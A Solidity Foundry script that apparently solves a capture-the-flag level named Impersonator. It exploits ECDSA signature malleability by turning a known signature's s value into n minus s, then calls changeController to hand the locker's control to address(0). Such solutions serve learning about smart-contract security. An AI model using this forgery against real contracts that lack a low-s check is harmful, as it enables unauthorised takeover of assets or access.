// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Impersonator.sol";
import "forge-std/Script.sol";

contract Solve is Script {
    function run() external {
        vm.startBroadcast();
        
        Impersonator victim = Impersonator(0x6Ecdd61664EaBe2D2987e567d965D4eD7296cd4d);
        ECLocker eclocker = ECLocker(victim.lockers(0));
        
        uint8 v = 28;
        uint256 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
        uint256 s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;
        
        uint256 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
        uint256 new_s = n - s;

        eclocker.changeController(
            v, 
            bytes32(r),
            bytes32(new_s),
            address(0)
        );

        vm.stopBroadcast();
    }
}